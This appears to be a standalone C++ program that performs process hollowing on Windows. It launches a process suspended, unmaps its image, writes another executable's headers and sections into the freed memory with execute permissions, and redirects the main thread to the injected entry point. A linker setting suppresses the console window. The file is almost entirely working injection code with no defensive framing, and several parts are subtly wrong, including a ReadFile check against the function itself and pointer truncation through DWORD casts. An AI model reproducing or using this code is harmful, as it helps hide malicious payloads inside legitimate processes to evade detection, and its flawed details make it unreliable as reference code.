#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <winternl.h>
#include <ntstatus.h>

#include <cmath>



using namespace std;
#pragma comment(lib,"ntdll.lib")

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

//Ntunmapviewofsection Making
typedef NTSTATUS(*Ntunmapviewofsection_)(
    HANDLE PRocessHAndle,
    PVOID Paddress
    );
//NtQueryInformationProcess MAking
typedef NTSTATUS(*NtQueryInformationProcess_)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );




int main() {
    LPSTARTUPINFOA info = new STARTUPINFOA();
    PROCESS_INFORMATION processInfo = PROCESS_INFORMATION();
    const char* path = "C:\\test1.exe";
    BOOL Rproc = CreateProcessA(NULL, (LPSTR)path, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, info, &processInfo);
    // Create The Process With his Proc
    if (!Rproc) {
        cout << "Creating Error" << endl;
        return 1;
    }

    HMODULE Hmodule = GetModuleHandle(L"ntdll.dll");

    cout << "Process Id" << processInfo.dwProcessId << endl;

    Ntunmapviewofsection_ Ntunmapviewofsection__ = (Ntunmapviewofsection_)GetProcAddress(Hmodule, "NtUnmapViewOfSection");

    //generate Ntunmapviewofsection

    NtQueryInformationProcess_ NtQueryInformationProcess__ = (NtQueryInformationProcess_)GetProcAddress(Hmodule, "NtQueryInformationProcess");
    //generate NtQueryInformationProcess

    PROCESS_BASIC_INFORMATION* PBI = new PROCESS_BASIC_INFORMATION();

    ULONG QuerRet = 0;

    NtQueryInformationProcess__(processInfo.hProcess, ProcessBasicInformation, (PVOID)PBI, sizeof(PROCESS_BASIC_INFORMATION), &QuerRet);
    //Get Processs Envirement Base Address
    cout << "Process Envirement Base Address Is: " << PBI->PebBaseAddress << endl;

    PVOID imageBase = 0;


    int RRead = ReadProcessMemory(processInfo.hProcess, (PBI->PebBaseAddress->Reserved3) + 1, &imageBase, sizeof(imageBase), 0);
    if (!RRead) {
        cout << "Error Read Offset" << endl;
        return 1;
    }

    cout << "ImageBase Offset Is: " << hex << imageBase << endl;
    //Get ImageBase Offset

    if (Ntunmapviewofsection__(processInfo.hProcess,imageBase) != 0) {
        cout << "Error NtUnmap" << endl;
        return 1;
    }

    //
    HANDLE hFILE = CreateFile(L"C:\\test.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);

    if (!hFILE) {
        cout << "Create File Error" << endl;
        return 1;
    }
    cout << "File Created!" << endl;


    LPBYTE szFile = new BYTE[GetFileSize(hFILE, 0) + 1];

    BOOL ReaRet = ReadFile(hFILE, szFile, GetFileSize(hFILE, 0), NULL, NULL);
    if (!ReadFile) {
        cout << "Error Read File " << endl;
        return 1;
    }

    cout << "File Read Success" << endl;
    //generate ReadFile To WriteIt LAter

    PIMAGE_DOS_HEADER PDosh = (PIMAGE_DOS_HEADER)szFile;
    PIMAGE_NT_HEADERS32 PNTh = (PIMAGE_NT_HEADERS32)(PDosh->e_lfanew + szFile);

    DWORD ImagSize = PNTh->OptionalHeader.SizeOfImage;
    cout << "Image SIze: " << ImagSize << endl;
    //get Image Size :)


    LPVOID VirAllocRet = VirtualAllocEx(processInfo.hProcess, imageBase, PNTh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!VirAllocRet) {
        cout << "Allocate Memory Failed" << GetLastError() << endl;
        return 1;
    }
    //allocate The Memory For Write
    cout << "Copying Headers" << endl;



    if (WriteProcessMemory(processInfo.hProcess, imageBase, szFile, PNTh->OptionalHeader.SizeOfHeaders, NULL) == 0){
        cout << "Write File Error" << endl;
        return 1;
    }
    //Write In Memories


    PIMAGE_SECTION_HEADER psection = (PIMAGE_SECTION_HEADER)(szFile + PDosh->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    //
    DWORD numFor = PNTh->FileHeader.NumberOfSections;
    for (int i = 1;i <= numFor;i++) {
        cout << "Sector Name" << psection->Name << endl;;
        if (WriteProcessMemory(processInfo.hProcess, (LPVOID)((DWORD)imageBase + (DWORD)psection->VirtualAddress), (LPCVOID)(szFile + psection->PointerToRawData), psection->SizeOfRawData, NULL) == 0) {
            cout << "Copying data error" << endl;
            return 1;
        }
        psection++;
    }
    cout << endl << psection->Name;
    //Write The Sectors
    
    //
    LPCONTEXT Cthread = new CONTEXT();
    Cthread->ContextFlags = CONTEXT_FULL;

    cout << "Getting thread contex-->" << endl;

    if (!GetThreadContext(processInfo.hThread, Cthread)) {
        cout << "Error Get Thread" << endl;
        return 1;
    }

    Cthread->Rax = ((DWORD)imageBase + PNTh->OptionalHeader.AddressOfEntryPoint);

    if (!SetThreadContext(processInfo.hThread, Cthread)) {
        cout << "Error Set Thread" << endl;
        return 1;
    }
    //generate the thread

    ResumeThread(processInfo.hThread);
    //Resume The Thread
    return 0;
}

